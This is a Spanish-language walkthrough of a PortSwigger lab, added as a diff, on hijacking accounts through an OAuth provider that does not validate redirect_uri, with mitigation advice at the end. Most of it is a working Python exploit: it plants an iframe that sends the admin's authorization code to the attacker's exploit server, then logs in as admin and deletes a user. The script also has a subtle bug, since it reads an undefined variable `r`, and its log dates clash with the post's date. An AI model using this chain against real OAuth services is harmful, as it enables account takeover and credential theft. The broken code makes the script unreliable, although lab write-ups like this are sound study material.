@@ -1,0 +1,252 @@
+---
+title: "Secuestro de Cuenta OAuth mediante redirect_uri"
+description: "Cómo explotar un proveedor OAuth mal configurado que no valida el parámetro redirect_uri, permitiendo a un atacante robar códigos de autorización y secuestrar cuentas de usuario."
+labUrl: "https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri"
+category: "OAuth"
+date: "2025-03-04"
+portswiggerDescription: "Este lab utiliza un servicio OAuth para permitir a los usuarios iniciar sesión con su cuenta de redes sociales. Una mala configuración del proveedor OAuth hace posible que un atacante robe códigos de autorización asociados a las cuentas de otros usuarios. Para resolver el lab, roba un código de autorización asociado al usuario admin, luego úsalo para acceder a su cuenta y eliminar al usuario `carlos`. El usuario admin abrirá cualquier cosa que envíes desde el servidor de exploits y siempre tiene una sesión activa con el servicio OAuth. Puedes iniciar sesión con tu propia cuenta de redes sociales usando las siguientes credenciales: `wiener:peter`"
+lang: "es"
+---
+
+import CollapsiblePartial from '../../../components/CollapsiblePartial.astro';
+import PartialContainer from '../../../components/PartialContainer.astro';
+
+## Conceptos Previos Necesarios Para Resolver El Lab
+
+<PartialContainer>
+  <CollapsiblePartial partial="oauth-2-basics" title="Entendiendo OAuth 2.0 y Flujos de Autorización" lang="es" />
+  <CollapsiblePartial partial="oauth-redirect-uri" title="Validación de redirect_uri en OAuth" lang="es" />
+</PartialContainer>
+
+## Resolución
+
+Primero exploremos el lab y entendamos la estructura de la aplicación:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/" | cat
+```
+
+> **Desglose del comando**: \
+`-s` = modo silencioso (sin barra de progreso) \
+`| cat` = redirigir la respuesta a mi [comando cat personalizado](https://github.com/echoesofwhoami/echoes-bat-theme) para una visualización con estilo
+
+La página principal es un blog. En la cabecera de navegación encontramos:
+
+```html
+<a href=/>Home</a><p>|</p>
+<a href="/my-account">My account</a><p>|</p>
+```
+
+También hay un enlace al servidor de exploits en el banner del lab:
+
+```html
+<a id='exploit-link' class='button' target='_blank'
+  href='https://exploit-<id>.exploit-server.net'>Go to exploit server</a>
+```
+
+Sigamos el enlace "My account" para ver el flujo de login OAuth:
+
+```bash
+curl -s -D - "https://<lab-url>.web-security-academy.net/my-account"
+```
+
+> **Desglose del comando**: \
+`-D -` = mostrar cabeceras de respuesta en stdout
+
+Respuesta:
+
+```
+HTTP/2 302
+location: /social-login
+set-cookie: session=KR7wbkOJP0jNRcaY6qaYPycEHmWmJILP; Secure; HttpOnly; SameSite=None
+```
+
+Redirige a `/social-login`. Sigamos la redirección:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/social-login" \
+  -b "session=KR7wbkOJP0jNRcaY6qaYPycEHmWmJILP"
+```
+
+La página contiene una etiqueta meta refresh que redirige al proveedor OAuth:
+
+```html
+<meta http-equiv=refresh content='3;url=https://oauth-<oauth-id>.oauth-server.net/auth?client_id=bow9iv6dj8fca1ourlao4&redirect_uri=https://<lab-url>.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email'>
+<p>We are now redirecting you to login with social media...</p>
+```
+
+Esto nos dice todo sobre la configuración OAuth:
+
+- **Servidor OAuth**: `https://oauth-<oauth-id>.oauth-server.net`
+- **Client ID**: `bow9iv6dj8fca1ourlao4`
+- **redirect_uri**: `https://<lab-url>.web-security-academy.net/oauth-callback`
+- **response_type**: `code` (flujo de código de autorización)
+- **scope**: `openid profile email`
+
+Sigamos el flujo OAuth completo manualmente. Primero, accedamos al endpoint de autorización OAuth:
+
+```bash
+curl -s -D - "https://oauth-<oauth-id>.oauth-server.net/auth?client_id=bow9iv6dj8fca1ourlao4&redirect_uri=https://<lab-url>.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email"
+```
+
+Respuesta:
+
+```
+HTTP/2 302
+location: /interaction/GSVAlvgrDIqNcFSmMcpkd
+set-cookie: _interaction=GSVAlvgrDIqNcFSmMcpkd; ...
+```
+
+El servidor OAuth redirige a una página de interacción (el formulario de login). Después de iniciar sesión con `wiener:peter` y confirmar el consentimiento, el servidor OAuth redirige de vuelta a:
+
+```
+HTTP/2 302
+location: https://<lab-url>.web-security-academy.net/oauth-callback?code=Gc5tqgJyU6dMHC23d7yvLoPxd3z9j2MOHU97Xc-YK33
+```
+
+El código de autorización se pasa en la URL al `redirect_uri`. Esta es la pieza crítica. Si podemos cambiar a dónde va esta redirección, podemos robar el código.
+
+### Probando la Vulnerabilidad
+
+Probemos si el proveedor OAuth valida el parámetro `redirect_uri` apuntándolo a nuestro servidor de exploits:
+
+```bash
+curl -s -D - "https://oauth-<oauth-id>.oauth-server.net/auth?client_id=bow9iv6dj8fca1ourlao4&redirect_uri=https://exploit-<exploit-id>.exploit-server.net&response_type=code&scope=openid%20profile%20email"
+```
+
+Respuesta:
+
+```
+HTTP/2 302
+location: /interaction/Mv8hr8rRWT08lq7hbcEqA
+```
+
+Sin errores en la respuesta. El servidor OAuth aceptó nuestro `redirect_uri` arbitrario sin ninguna validación. Esto significa que después de la autenticación, el código de autorización se enviará a cualquier URL que especifiquemos. Incluyendo nuestro servidor de exploits.
+
+### El Exploit
+
+El plan de ataque:
+
+1. Crear un iframe que active el flujo OAuth con `redirect_uri` apuntando a nuestro servidor de exploits
+2. Alojarlo en el servidor de exploits y entregárselo a la víctima admin
+3. Cuando el navegador del admin cargue el iframe, como ya tiene una sesión activa con el proveedor OAuth, el flujo de autorización se completa automáticamente. Sin necesidad de login ni consentimiento
+4. El proveedor OAuth redirige al admin a nuestro servidor de exploits con su código de autorización en la URL
+5. Leemos el código del log de acceso del servidor de exploits
+6. Usamos el código robado para iniciar sesión como admin
+
+Hay demasiadas peticiones para hacerlo manualmente, así que mostraré el flujo con python:
+
+```python
+import requests
+import re
+import time
+
+LAB = "https://<lab-url>.web-security-academy.net"
+OAUTH = "https://oauth-<oauth-id>.oauth-server.net"
+EXPLOIT = "https://exploit-<exploit-id>.exploit-server.net"
+
+session_1 = requests.Session()
+
+# Step 1: Extract client_id from the lab's OAuth login link
+# The client_id is found in the meta refresh tag on the /my-account page
+response_1 = session_1.get(f"{LAB}/my-account")
+
+client_id = re.search(r'client_id=([a-zA-Z0-9]+)', r.text).group(1)
+
+print(f"Found client_id: {client_id}")
+
+# Step 2: Craft the malicious iframe
+# When loaded by the victim, it will initiate an OAuth flow
+# with redirect_uri pointing to our exploit server
+iframe_payload = (
+    f'<iframe src="{OAUTH}/auth?client_id={client_id}'
+    f'&redirect_uri={EXPLOIT}'
+    f'&response_type=code'
+    f'&scope=openid%20profile%20email"></iframe>'
+)
+
+# Step 3: Store the exploit on the exploit server
+session_1.post(f"{EXPLOIT}", data={
+    "urlIs498": "/exploit",
+    "responseFile": "/exploit",
+    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
+    "responseBody": iframe_payload,
+    "formAction": "STORE"
+})
+
+# Step 4: Deliver the exploit to the victim (admin)
+session_1.post(f"{EXPLOIT}", data={
+    "urlIs498": "/exploit",
+    "responseFile": "/exploit",
+    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
+    "responseBody": iframe_payload,
+    "formAction": "DELIVER_TO_VICTIM"
+})
+
+# Step 5: Wait for the victim to trigger the exploit
+time.sleep(3)
+
+# Step 6: Read the exploit server logs to extract the stolen code
+response_2 = session_1.get(f"{EXPLOIT}/log")
+
+stolen_code = re.search(r"code=([A-Za-z0-9_-]+)", response_2.text)
+
+if not stolen_code:
+    print("Failed to steal code")
+    exit(1)
+
+stolen_code = stolen_code.group(1)
+
+print(f"Stolen authorization code: {stolen_code}")
+
+# We create a new session (session_2) because we need a clean session context
+# The first session (session_1) was used for exploit server interactions and contains
+# cookies/state from the exploit server, not the target application
+session_2 = requests.Session()
+
+# Step 7: Use the stolen code to log in as admin
+session_2.get(f"{LAB}/oauth-callback?code={stolen_code}", allow_redirects=True)
+
+# Step 8: Access admin panel and delete carlos
+response_3 = session_2.get(f"{LAB}/admin/delete?username=carlos")
+print("Carlos deleted" if response_3.status_code == 200 else "Failed to delete carlos")
+```
+
+> **Desglose del script**: \
+> El script automatiza la cadena completa del exploit:
+> 1. **Extrae el client_id** de la configuración de login OAuth del lab en la página /my-account
+> 2. **Crea un iframe** que inicia un flujo OAuth con un `redirect_uri` manipulado apuntando al servidor de exploits del atacante
+> 3. **Almacena y entrega** el exploit a través de la funcionalidad del servidor de exploits del lab
+> 4. **Espera** a que la víctima admin cargue el iframe. Como tiene una sesión OAuth activa, el flujo se completa silenciosamente y redirige al servidor de exploits con el código de autorización
+> 5. **Extrae** el código de autorización robado de los logs de acceso del servidor de exploits
+> 6. **Usa el código robado** para completar el callback OAuth en la aplicación del blog, obteniendo una sesión de admin
+> 7. **Elimina a carlos** a través del panel de administración
+
+Salida esperada:
+
+```
+Stolen authorization code: OTy3aQ-1n6qA8w5jQcqWH_parimQeFvX2PsGkVHkkNa
+Carlos deleted
+```
+
+Los logs del servidor de exploits muestran exactamente lo que pasó cuando la víctima admin cargó nuestro iframe malicioso:
+
+```
+10.0.3.152  2026-03-04 16:19:08 +0000 "GET /exploit/ HTTP/1.1" 200
+  "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+
+10.0.3.152  2026-03-04 16:19:08 +0000 "GET /?code=OTy3aQ-1n6qA8w5jQcqWH_parimQeFvX2PsGkVHkkNa HTTP/1.1" 200
+  "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+```
+
+La primera petición es la víctima cargando la página del exploit. \
+La segunda es el proveedor OAuth redirigiendo el navegador de la víctima a nuestro servidor con el código de autorización. \
+**La cuenta del admin fue secuestrada con un solo iframe, aniquilando a carlos en el proceso.**
+
+## Mitigación
+
+1. **Validar estrictamente redirect_uri**: El proveedor OAuth debe forzar una coincidencia exacta entre el `redirect_uri` registrado y el proporcionado en la petición de autorización. Nunca se debe permitir coincidencia parcial o con comodines
+2. **Usar el parámetro `state`**: Incluir un parámetro `state` criptográficamente aleatorio en las peticiones de autorización y validarlo en el callback. Esto previene ataques CSRF y hace más difícil usar códigos robados
+3. **Usar PKCE (Proof Key for Code Exchange)**: PKCE añade un mecanismo de verificador/challenge que vincula el código de autorización al cliente que inició el flujo, haciendo los códigos robados inútiles sin el verificador original
+4. **Códigos de autorización de corta duración**: Los códigos de autorización deben expirar rápidamente (en segundos) y ser de un solo uso para minimizar la ventana de explotación
+5. **Registrar URIs de redirección exactas**: Las aplicaciones cliente deben registrar URIs de redirección específicas y completas con el proveedor OAuth. Nunca usar coincidencia de patrones ni permitir URIs de redirección dinámicas
